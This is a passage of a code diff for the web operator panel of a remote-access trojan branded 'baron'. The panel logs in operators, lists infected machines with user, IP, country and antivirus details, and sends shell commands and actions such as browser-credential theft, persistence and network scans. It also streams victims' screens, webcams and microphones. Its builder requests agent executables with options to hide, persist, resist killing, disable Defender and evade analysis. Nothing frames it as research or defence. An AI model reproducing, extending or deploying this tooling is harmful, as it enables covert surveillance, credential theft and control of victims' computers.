+    mouseX = (e.clientX - window.innerWidth/2) * 2;
+    mouseY = (e.clientY - window.innerHeight/2) * 2;
+  });
+
+  function animate() {
+    requestAnimationFrame(animate);
+    particles.rotation.x += 0.0005; particles.rotation.y += 0.001;
+    camera.position.x += (mouseX - camera.position.x) * 0.05;
+    camera.position.y += (-mouseY - camera.position.y) * 0.05;
+    camera.lookAt(scene.position);
+    // Update color based on theme
+    const goldHex = getComputedStyle(document.documentElement).getPropertyValue('--gold').trim();
+    if(goldHex) material.color.set(goldHex);
+    renderer.render(scene, camera);
+  }
+  animate();
 }
+// ────────────────────────────────────────
+
+let TOKEN = localStorage.getItem('bt') || '';
+let CLIENTS = {}, SELECTED_CID = null, socket = null, BUILD_DATA = null;
+
+window.onload = () => {
+  init3D();
+  const savedTheme = localStorage.getItem('baron-theme');
+  if(savedTheme) setTheme(savedTheme);
+  if(TOKEN) { 
+    document.getElementById('login').style.opacity = '0';
+    setTimeout(() => { document.getElementById('login').style.display = 'none'; document.getElementById('hud').style.display = 'flex'; }, 800);
+    initSocket(); fetchAll(); 
+  }
+};
 
 setInterval(() => {
   const c = document.getElementById('clock');
   if(c) c.textContent = new Date().toLocaleTimeString('en-US',{hour12:false});
 }, 1000);
 
+// Continuous Telemetry Sync
+setInterval(() => { if (TOKEN && document.getElementById('hud').style.display === 'flex') fetchAll(); }, 3000);
+
+function setTheme(name) {
+  document.documentElement.setAttribute('data-theme', name);
+  localStorage.setItem('baron-theme', name);
+}
+
+async function doLogin() {
+  const user = document.getElementById('u').value, pwd = document.getElementById('p').value;
+  const res = await fetch('/api/panel/login', {
+    method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:user, password:pwd})
+  }).then(r => r.json()).catch(() => null);
+  if (res && res.token) {
+    TOKEN = res.token; localStorage.setItem('bt', TOKEN);
+    document.getElementById('login').style.opacity = '0';
+    setTimeout(() => { document.getElementById('login').style.display = 'none'; document.getElementById('hud').style.display = 'flex'; }, 800);
+    initSocket(); fetchAll();
+  } else {
+    document.getElementById('login-err').textContent = 'ACCESS DENIED';
+  }
+}
+
 function logout() {
   fetch('/api/panel/logout', {method:'POST', headers:{'X-Token':TOKEN}});
-  localStorage.removeItem('bt'); TOKEN = ''; SESSION = null;
-  location.reload();
+  localStorage.removeItem('bt'); location.reload();
 }
 
 async function apiFetch(url, opts = {}) {
-  opts.headers = opts.headers || {};
-  opts.headers['X-Token'] = TOKEN;
+  opts.headers = opts.headers || {}; opts.headers['X-Token'] = TOKEN;
   const r = await fetch(url, opts).catch(() => null);
   if (!r) return null;
   if (r.status === 401) { logout(); return null; }
   return r.json().catch(() => null);
 }
 
+function nav(el, page) {
+  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(`page-${page}`).classList.add('active');
+  document.getElementById('pg-title').textContent = el.textContent.trim();
+}
+
+// ── Rendering & Sync
 async function fetchAll() {
   const d = await apiFetch('/api/panel/clients');
   if (!d || !d.ok) return;
   CLIENTS = d.clients || {};
-  renderStats(d);
-  renderClientTable();
-  renderAgentTable();
-  populateStreamSelect();
+  renderStats(d); renderTables(); populateStreamSelect();
 }
 
 function renderStats(d) {
@@ -700,410 +478,155 @@ function renderStats(d) {
   document.getElementById('s-online').textContent = online;
   document.getElementById('s-tasks').textContent = d.tasks || 0;
   const up = d.uptime || 0;
-  const h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
-  document.getElementById('s-uptime').textContent = h ? `${h}h` : `${m}m`;
-  document.getElementById('badge-online').textContent = `${online} online`;
+  document.getElementById('s-uptime').textContent = Math.floor(up/3600) ? `${Math.floor(up/3600)}h` : `${Math.floor((up%3600)/60)}m`;
+  document.getElementById('badge-online').innerHTML = `<span class="dot"></span>${online} ONLINE`;
   renderLogs(d.logs || []);
 }
 
 function timeSince(ts) {
-  if (!ts) return '—';
-  const s = Math.floor(Date.now()/1000 - ts);
-  if (s < 60) return `${s}s ago`;
-  if (s < 3600) return `${Math.floor(s/60)}m ago`;
-  return `${Math.floor(s/3600)}h ago`;
+  if (!ts) return '—'; const s = Math.floor(Date.now()/1000 - ts);
+  if (s < 60) return `${s}s`; if (s < 3600) return `${Math.floor(s/60)}m`; return `${Math.floor(s/3600)}h`;
 }
 
 function isOnline(c) { return (Date.now()/1000 - (c.last_seen||0)) < 300; }
 
-function clientRow(cid, c, cols) {
-  const on = isOnline(c);
-  const pill = on
-    ? '<span class="pill pill-green"><span class="pill-dot"></span>Online</span>'
-    : '<span class="pill pill-red"><span class="pill-dot"></span>Offline</span>';
-  
-  const trStart = `<tr oncontextmenu="showContextMenu(event, '${cid}')" style="cursor:context-menu">`;
-  
-  if (cols === 7) {
-    return `${trStart}
-      <td class="cid">${cid.substring(0,12)}…</td>
-      <td>${c.hostname||'—'}</td>
-      <td>${(c.os||'').substring(0,30)}</td>
-      <td>${c.internal_ip||c.ip||'—'}</td>
-      <td>${pill}</td>
-      <td>${timeSince(c.last_seen)}</td>
-      <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
-    </tr>`;
-  }
-  return `${trStart}
-    <td class="cid">${cid.substring(0,12)}…</td>
-    <td>${c.hostname||'—'}</td>
-    <td>${(c.os||'').substring(0,25)}</td>
-    <td>${c.user||'—'}</td>
-    <td>${c.internal_ip||c.ip||'—'}</td>
-    <td>${c.country||'—'}</td>
-    <td>${c.av||'—'}</td>
-    <td>${pill}</td>
-    <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
-  </tr>`;
-}
+function renderTables() {
+  const tk = Object.keys(CLIENTS);
+  document.getElementById('client-table').innerHTML = tk.length ? tk.map(k => {
+    const c = CLIENTS[k], on = isOnline(c);
+    const m = on ? `<span class="pill pill-on"><span class="dot"></span>ONLINE</span>` : `<span class="pill pill-off"><span class="dot"></span>OFFLINE</span>`;
+    return `<tr oncontextmenu="showContextMenu(event, '${k}')" style="cursor:context-menu">
+      <td style="font-family:var(--mono); color:var(--text-dim);">${k.substring(0,8)}</td>
+      <td>${c.hostname||'—'}</td><td>${(c.os||'').substring(0,25)}</td><td>${c.internal_ip||c.ip||'—'}</td>
+      <td>${m}</td><td>${timeSince(c.last_seen)}</td></tr>`;
+  }).join('') : '<tr><td colspan="6" style="text-align:center; padding:40px; color:var(--text-dim)">No Active Nodes</td></tr>';
 
-function renderClientTable() {
-  const tb = document.getElementById('client-table');
-  const keys = Object.keys(CLIENTS);
-  tb.innerHTML = keys.length ? keys.map(k => clientRow(k, CLIENTS[k], 7)).join('') :
-    '<tr><td colspan="7" style="text-align:center;padding:32px;color:var(--text-dim)">No agents connected</td></tr>';
-}
-
-function renderAgentTable() {
-  const tb = document.getElementById('agent-table');
-  const keys = Object.keys(CLIENTS);
-  tb.innerHTML = keys.length ? keys.map(k => clientRow(k, CLIENTS[k], 9)).join('') :
-    '<tr><td colspan="9" style="text-align:center;padding:32px;color:var(--text-dim)">No agents</td></tr>';
+  document.getElementById('agent-table').innerHTML = tk.length ? tk.map(k => {
+    const c = CLIENTS[k], on = isOnline(c);
+    const m = on ? `<span style="color:var(--green)">Online</span>` : `<span style="color:var(--red)">Offline</span>`;
+    return `<tr oncontextmenu="showContextMenu(event, '${k}')" style="cursor:context-menu">
+      <td style="font-family:var(--mono); color:var(--text-dim);">${k.substring(0,8)}</td>
+      <td>${c.hostname||'—'}</td><td>${c.user||'—'}</td><td>${c.ip||'—'}</td>
+      <td>${c.country||'—'}</td><td>${c.av||'—'}</td><td>${m}</td></tr>`;
+  }).join('') : '<tr><td colspan="7" style="text-align:center; padding:40px; color:var(--text-dim)">Database Empty</td></tr>';
 }
 
 function renderLogs(logs) {
   const el = document.getElementById('log-body');
-  if (!el) return;
-  
-  const latest = logs[logs.length - 1];
-  if(latest && latest.time > (window.lastLogTime||0)) {
-     window.lastLogTime = latest.time;
-     if(!window.initialLogsLoad) { window.initialLogsLoad=true; }
-     else { islandNotify(latest.msg, latest.level === 'error' ? 'var(--red)' : (latest.level==='warn'?'#febc2e':'var(--gold)')); }
-  }
-
-  el.innerHTML = [...logs].reverse().slice(0, 80).map(l => {
+  if(!el) return;
+  el.innerHTML = [...logs].reverse().slice(0,50).map(l => {
     const t = l.time ? new Date(l.time*1000).toLocaleTimeString() : '';
-    const cls = l.level === 'warn' ? 'log-warn' : l.level === 'error' ? 'log-error' : 'log-info';
+    const cls = l.level==='warn'?'log-warn':(l.level==='error'?'log-error':'log-info');
     return `<div class="log-entry ${cls}"><span class="log-time">${t}</span><span class="log-msg">${l.msg}</span></div>`;
-  }).join('') || '<div style="color:var(--text-dim);text-align:center;padding:32px">No logs</div>';
-}
-
-async function fetchLogs() {
-  const d = await apiFetch('/api/panel/clients');
-  if (d && d.ok) renderLogs(d.logs || []);
-}
-
-function populateStreamSelect() {
-  const sel = document.getElementById('stream-cid');
-  const prev = sel.value;
-  sel.innerHTML = '<option value="">— Select Agent —</option>';
-  Object.entries(CLIENTS).forEach(([k, c]) => {
-    const o = document.createElement('option');
-    o.value = k; o.textContent = `${c.hostname||k.substring(0,8)} (${isOnline(c)?'Online':'Offline'})`;
-    sel.appendChild(o);
-  });
-  if (prev) sel.value = prev;
-}
-
-// ── Agent Control Modal
-function openAgent(cid) {
-  SELECTED_CID = cid;
-  const c = CLIENTS[cid] || {};
-  document.getElementById('modal-title').textContent = `Control: ${c.hostname||cid.substring(0,12)}`;
-  document.getElementById('modal-body').innerHTML = `
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px">
-      <div style="font-size:.78rem;color:var(--text-dim)">OS: <b style="color:var(--text)">${c.os||'—'}</b></div>
-      <div style="font-size:.78rem;color:var(--text-dim)">User: <b style="color:var(--text)">${c.user||'—'}</b></div>
-      <div style="font-size:.78rem;color:var(--text-dim)">IP: <b style="color:var(--text)">${c.ip||'—'}</b></div>
-      <div style="font-size:.78rem;color:var(--text-dim)">Last: <b style="color:var(--text)">${timeSince(c.last_seen)}</b></div>
-    </div>
-    <div class="terminal">
-      <div class="term-bar">
-        <div class="term-dot" style="background:#ff5f57"></div>
-        <div class="term-dot" style="background:#febc2e"></div>
-        <div class="term-dot" style="background:#28c840"></div>
-        <span style="margin-left:8px;font-size:.72rem;color:var(--text-dim)">Shell · ${c.hostname||'agent'}</span>
-      </div>
-      <div class="term-body" id="agent-out" style="height:200px"></div>
-      <div class="term-inp-row">
-        <span class="term-prompt">baron@${c.hostname||'host'}&gt;&nbsp;</span>
-        <input class="term-inp" id="agent-cmd" placeholder="shell command…" onkeydown="if(event.key==='Enter')sendCmd()">
-        <button class="btn btn-gold btn-sm" onclick="sendCmd()">Run</button>
-      </div>
-    </div>
-    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:16px">
-      <button class="btn btn-outline btn-sm" onclick="cmd('info')">SysInfo</button>
-      <button class="btn btn-outline btn-sm" onclick="cmd('browsers')">Browser Creds</button>
-      <button class="btn btn-outline btn-sm" onclick="cmd('persist_install')">Persist</button>
-      <button class="btn btn-outline btn-sm" onclick="cmd('netscan')">NetScan</button>
-      <button class="btn btn-red btn-sm" onclick="cmd('kill')">Kill</button>
-    </div>
-  `;
-  showModal();
-  loadResults();
-}
-
-async function sendCmd() {
-  const inp = document.getElementById('agent-cmd');
-  const c = inp.value.trim(); if (!c) return;
-  inp.value = '';
-  appendOut(document.getElementById('agent-out'), `> ${c}`, '#aaaaaa');
-  await sendCommand({action:'exec', cmd: c});
-}
-
-async function cmd(action) {
-  await sendCommand({action});
-}
-
-async function sendCommand(payload) {
-  if (!SELECTED_CID) return;
-  const r = await apiFetch('/api/panel/command', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({cid: SELECTED_CID, cmd: payload})
-  });
-  if (r && r.ok) appendOut(document.getElementById('agent-out'), `[Sent: ${payload.action}]`, '#5b9fff');
-  
-  if (['screen_start', 'webcam_start', 'audio_start'].includes(payload.action)) {
-    document.getElementById('stream-cid').value = SELECTED_CID;
-    nav(document.querySelector('[data-page="streams"]'), 'streams');
-  }
+  }).join('');
 }
 
 // ── Context Menu
 function showContextMenu(e, cid) {
-  e.preventDefault();
-  SELECTED_CID = cid;
-  const menu = document.getElementById('ctx-menu');
-  document.getElementById('ctx-target').textContent = (CLIENTS[cid]?.hostname || cid).substring(0, 16);
-  menu.classList.add('show');
-  
-  let x = e.clientX;
-  let y = e.clientY;
-  const mx = window.innerWidth - menu.offsetWidth - 10;
-  const my = window.innerHeight - menu.offsetHeight - 10;
-  if(x > mx) x = mx;
-  if(y > my) y = my;
-  menu.style.left = x + 'px';
-  menu.style.top = y + 'px';
+  e.preventDefault(); SELECTED_CID = cid;
+  document.getElementById('ctx-cid').textContent = cid.substring(0,8);
+  const m = document.getElementById('ctx-menu');
+  m.style.left = e.pageX + 'px'; m.style.top = e.pageY + 'px';
+  m.classList.add('show');
 }
+document.addEventListener('click', () => document.getElementById('ctx-menu').classList.remove('show'));
 
-function hideCtx() {
-  document.getElementById('ctx-menu').classList.remove('show');
-}
-document.addEventListener('click', hideCtx);
-document.addEventListener('contextmenu', (e) => {
-  if(!e.target.closest('tr')) hideCtx();
-});
-
-async function ctxCmd(action) {
-  hideCtx();
-  if(!SELECTED_CID) return;
-  await sendCommand({action});
-}
-
-
-function appendOut(el, text, color='#a0f0a0') {
-  if (!el) return;
-  const line = document.createElement('div');
-  line.style.color = color; line.textContent = text;
-  el.appendChild(line);
-  el.scrollTop = el.scrollHeight;
-}
-
-async function loadResults() {
+function ctxCmd(cmd) { sendCommand({action:cmd}); }
+async function sendCommand(taskObj) {
   if (!SELECTED_CID) return;
-  const d = await apiFetch(`/api/panel/results?cid=${SELECTED_CID}`);
-  if (!d || !d.ok) return;
-  const el = document.getElementById('agent-out');
-  if (!el) return;
-  (d.results || []).slice(-20).forEach(r => {
-    appendOut(el, `[${r.type||'?'}] ${JSON.stringify(r.data||'').substring(0,200)}`, '#c0f0c0');
-  });
+  const r = await apiFetch('/api/panel/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cid:SELECTED_CID, task:taskObj})});
+  if (r && r.ok) { let l=document.getElementById('log-body'); if(l) l.innerHTML=`<div class="log-entry log-info"><span class="log-msg" style="color:var(--gold)">Command [${taskObj.action}] dispatched to node ${SELECTED_CID.substring(0,8)}</span></div>` + l.innerHTML; }
 }
 
-// ── Streams
+// ── Stream
+function populateStreamSelect() {
+  const sel = document.getElementById('stream-cid');
+  sel.innerHTML = '<option value="">— Select Node —</option>' + Object.keys(CLIENTS).map(k => `<option value="${k}">${CLIENTS[k].hostname || 'Unknown'} (${k.substring(0,8)})</option>`).join('');
+}
 function sendStream(action) {
   const cid = document.getElementById('stream-cid').value;
-  if (!cid) return alert('Select an agent first');
-  SELECTED_CID = cid;
-  sendCommand({action});
-}
-
-// ── Files
-async function listFiles() {
-  const cid = SELECTED_CID || Object.keys(CLIENTS)[0];
-  if (!cid) return;
-  const path = document.getElementById('file-path').value || 'C:\\';
-  SELECTED_CID = cid;
-  await sendCommand({action:'filelist', path});
-  document.getElementById('file-out').textContent = 'Command sent. Waiting for agent response…';
+  if(!cid) return alert('Select Node first');
+  SELECTED_CID = cid; sendCommand({action});
 }
 
 // ── Builder
 async function buildAgent() {
   const opts = {
-    server: document.getElementById('b-server').value,
-    name: document.getElementById('b-name').value,
-    beacon: parseInt(document.getElementById('b-beacon').value) || 5000,
-    output_type: document.getElementById('b-type').value,
-    hidden: document.getElementById('b-hidden').checked,
-    persist: document.getElementById('b-persist').checked,
-    anti_kill: document.getElementById('b-antikill').checked,
-    disable_defender: document.getElementById('b-defender').checked,
-    fake_error: document.getElementById('b-fakeerr').checked,
-    anti_analysis: document.getElementById('b-antianalysis').checked,
-    debug: document.getElementById('b-debug').checked,
+    server: document.getElementById('b-server').value, name: document.getElementById('b-name').value,
+    beacon: parseInt(document.getElementById('b-beacon').value) || 5000, output_type: document.getElementById('b-type').value,
+    hidden: document.getElementById('b-hidden').checked, persist: document.getElementById('b-persist').checked,
+    anti_kill: document.getElementById('b-antikill').checked, disable_defender: document.getElementById('b-defender').checked,
+    anti_analysis: document.getElementById('b-antianalysis').checked, debug: document.getElementById('b-debug').checked
   };
-  if (!opts.server) return alert('C2 Server URL required');
-  const r = await apiFetch('/api/panel/build', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify(opts)
-  });
+  const r = await apiFetch('/api/panel/build', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(opts)});
   if (!r) return;
-  const out = document.getElementById('build-out');
-  const src = document.getElementById('build-src');
-  out.style.display = 'block';
+  document.getElementById('build-out').style.display='block';
   if (r.ok) {
     BUILD_DATA = r;
-    let header = '';
-    if (r.compile_status === 'success') {
-      header = '✅ COMPILED SUCCESSFULLY\n📥 Download: ' + r.download_url + '\n\n';
-    } else if (r.compile_status === 'failed') {
-      header = '❌ COMPILATION FAILED: ' + (r.compile_error || 'Unknown error') + '\n📄 Source code returned below:\n\n';
-    } else {
-      header = '⚠ No compiler on server. Source code (.cs) returned:\n\n';
-    }
-    src.textContent = header + (r.source || '');
-  } else {
-    src.textContent = 'Error: ' + (r.error || 'Unknown');
-  }
+    const txt = (r.compile_status==='success') ? `✅ COMPILED\nDownload: ${r.download_url}\n` : `⚠ COMPILER STATUS: ${r.compile_status}\n`;
+    document.getElementById('build-src').textContent = txt + (r.source||'');
+  } else document.getElementById('build-src').textContent = 'Error: ' + (r.error||'');
 }
-
-function clearBuildOut() {
-  document.getElementById('build-out').style.display = 'none';
-  document.getElementById('build-src').textContent = '';
-  BUILD_DATA = null;
-}
-
 async function downloadBuild() {
-  if (!BUILD_DATA) return;
-  if (BUILD_DATA.download_url) {
-    // Download compiled .exe via fetch with auth token
-    try {
-      const resp = await fetch(BUILD_DATA.download_url, {
-        headers: {'X-Token': TOKEN}
-      });
-      if (!resp.ok) { alert('Download failed: ' + resp.status); return; }
-      const blob = await resp.blob();
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = (BUILD_DATA.name||'agent') + '.exe';
-      a.click();
-      URL.revokeObjectURL(a.href);
-    } catch(e) { alert('Download error: ' + e); }
-  } else {
-    // Download .cs source
-    const blob = new Blob([BUILD_DATA.source || ''], {type:'text/plain'});
-    const a = document.createElement('a');
-    a.href = URL.createObjectURL(blob); a.download = (BUILD_DATA.name||'agent') + '.cs'; a.click();
-  }
-}
-
-
-// ── Socket.IO
-function initSocket() {
-  try {
-    socket = io({auth:{token:TOKEN}});
-    socket.emit('auth', {token:TOKEN});
-    
-    let audioCtx = null;
-    
-    socket.on('stream_frame', d => {
-      if (d.type === 'screen') {
-          const el = document.getElementById('screen-frame');
-          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
-      } else if (d.type === 'webcam') {
-          const el = document.getElementById('webcam-frame');
-          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
-      }
-    });
-    
-    socket.on('audio_chunk', async d => {
-      try {
-        if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        if(audioCtx.state === 'suspended') await audioCtx.resume();
-        const binary = atob(d.data); const len = binary.length; const bytes = new Uint8Array(len);
-        for (let i=0; i<len; i++) bytes[i] = binary.charCodeAt(i);
-        const aBuf = await audioCtx.decodeAudioData(bytes.buffer);
-        const src = audioCtx.createBufferSource(); src.buffer = aBuf; src.connect(audioCtx.destination); src.start(0);
-      } catch(e) { console.error("Audio play error", e); }
-    });
-
-    socket.on('result', d => {
-      const el = document.getElementById('agent-out');
-      if (el && d.cid === SELECTED_CID) appendOut(el, `[${d.type}] ${JSON.stringify(d.data||'').substring(0,300)}`);
-    });
-  } catch(e) {}
-}
-
-// ── Navigation
-function nav(el, page) {
-  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-  el.classList.add('active');
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  document.getElementById(`page-${page}`).classList.add('active');
-  document.getElementById('pg-title').textContent = el.textContent.trim();
-  if (page === 'logs') fetchLogs();
-}
-
-// ── Modal
-function showModal() { document.getElementById('modal-overlay').classList.add('show'); }
-function closeModal() { document.getElementById('modal-overlay').classList.remove('show'); SELECTED_CID = null; }
-
-// ── Enter to login
-document.querySelectorAll('#u,#p').forEach(el => el.addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); }));
-
-// ── Drag & Drop (Masonry Modular Layout)
-document.addEventListener('DOMContentLoaded', () => {
-  const statsContainer = document.querySelector('.stats-grid');
-  if(statsContainer) {
-    let draggedItem = null;
-    let savedOrder = null;
-    try { savedOrder = JSON.parse(localStorage.getItem('baron-stats-order')); }catch(e){}
-    
-    // Restore order if saved
-    if(savedOrder && Array.isArray(savedOrder)) {
-      const stats = [...statsContainer.querySelectorAll('.stat')];
-      savedOrder.forEach(id => {
-        const el = stats.find(s => s.querySelector('.stat-val') && s.querySelector('.stat-val').id === id);
-        if(el) statsContainer.appendChild(el);
-      });
+  if(!BUILD_DATA) return;
+  if(BUILD_DATA.download_url) {
+    const resp = await fetch(BUILD_DATA.download_url,{headers:{'X-Token':TOKEN}});
+    if(resp.ok) {
+      const a = document.createElement('a'); a.href = URL.createObjectURL(await resp.blob()); a.download = (BUILD_DATA.name||'agent')+'.exe'; a.click();
     }
-
-    statsContainer.querySelectorAll('.stat').forEach(stat => {
-      stat.setAttribute('draggable', true);
-      stat.addEventListener('dragstart', function(e) {
-        draggedItem = this;
-        setTimeout(() => this.style.opacity = '0.4', 0);
-      });
-      stat.addEventListener('dragend', function() {
-        setTimeout(() => {
-          this.style.opacity = '1';
-          draggedItem = null;
-          // save order
-          const newOrder = [...statsContainer.querySelectorAll('.stat-val')].map(el => el.id);
-          localStorage.setItem('baron-stats-order', JSON.stringify(newOrder));
-        }, 0);
-      });
-      stat.addEventListener('dragover', e => e.preventDefault());
-      stat.addEventListener('dragenter', function(e) { e.preventDefault(); this.style.transform = 'scale(1.05)'; });
-      stat.addEventListener('dragleave', function() { this.style.transform = ''; });
-      stat.addEventListener('drop', function() {
-        this.style.transform = '';
-        if (draggedItem && this !== draggedItem) {
-          let all = [...statsContainer.querySelectorAll('.stat')];
-          let draggedIdx = all.indexOf(draggedItem);
-          let droppedIdx = all.indexOf(this);
-          if(draggedIdx < droppedIdx) this.parentNode.insertBefore(draggedItem, this.nextSibling);
-          else this.parentNode.insertBefore(draggedItem, this);
-        }
-      });
-    });
+  } else {
+    const a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([BUILD_DATA.source||''],{type:'text/plain'})); a.download = (BUILD_DATA.name||'agent')+'.cs'; a.click();
   }
-});
+}
 
+// ── Socket
+function initSocket() {
+  socket = io({auth:{token:TOKEN}}); socket.emit('auth', {token:TOKEN});
+  let audioCtx = null;
+  socket.on('stream_frame', d => {
+    const el = document.getElementById(d.type==='screen' ? 'screen-frame' : 'webcam-frame');
+    if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+  });
+  socket.on('audio_chunk', async d => {
+    if(!audioCtx) audioCtx = new (window.AudioContext||window.webkitAudioContext)();
+    if(audioCtx.state==='suspended') await audioCtx.resume();
+    const binary = atob(d.data); const bytes = new Uint8Array(binary.length);
+    for(let i=0;i<binary.length;i++) bytes[i]=binary.charCodeAt(i);
+    const aBuf = await audioCtx.decodeAudioData(bytes.buffer);
+    const src = audioCtx.createBufferSource(); src.buffer = aBuf; src.connect(audioCtx.destination); src.start(0);
+  });
+}
+
+// ── Drag & Drop Stat Grid
+document.addEventListener('DOMContentLoaded', () => {
+    const cont = document.getElementById('stats-container');
+    if(!cont) return;
+    let dragged = null;
+    let o = null; try{o = JSON.parse(localStorage.getItem('baron-v2-stats'))}catch(e){}
+    if(o && o.length){
+        const stats = [...cont.querySelectorAll('.stat-card')];
+        o.forEach(id=>{ const r=stats.find(s=>s.querySelector('.stat-val').id===id); if(r) cont.appendChild(r); });
+    }
+    cont.querySelectorAll('.stat-card').forEach(s => {
+        s.addEventListener('dragstart', function(){ dragged=this; setTimeout(()=>this.style.opacity='0.4',0); });
+        s.addEventListener('dragend', function(){ 
+            setTimeout(()=>{ this.style.opacity='1'; dragged=null; 
+            localStorage.setItem('baron-v2-stats', JSON.stringify([...cont.querySelectorAll('.stat-val')].map(e=>e.id)));
+            },0);
+        });
+        s.addEventListener('dragover', e=>e.preventDefault());
+        s.addEventListener('dragenter', function(e){ e.preventDefault(); this.style.transform='scale(1.05)'; });
+        s.addEventListener('dragleave', function(){ this.style.transform=''; });
+        s.addEventListener('drop', function(){
+            this.style.transform='';
+            if(dragged && this !== dragged){
+                let all=[...cont.querySelectorAll('.stat-card')], dI=all.indexOf(dragged), cI=all.indexOf(this);
+                if(dI<cI) this.parentNode.insertBefore(dragged, this.nextSibling);
+                else this.parentNode.insertBefore(dragged, this);
+            }
+        });
+    });
+});
 </script>
 </body>
 </html>
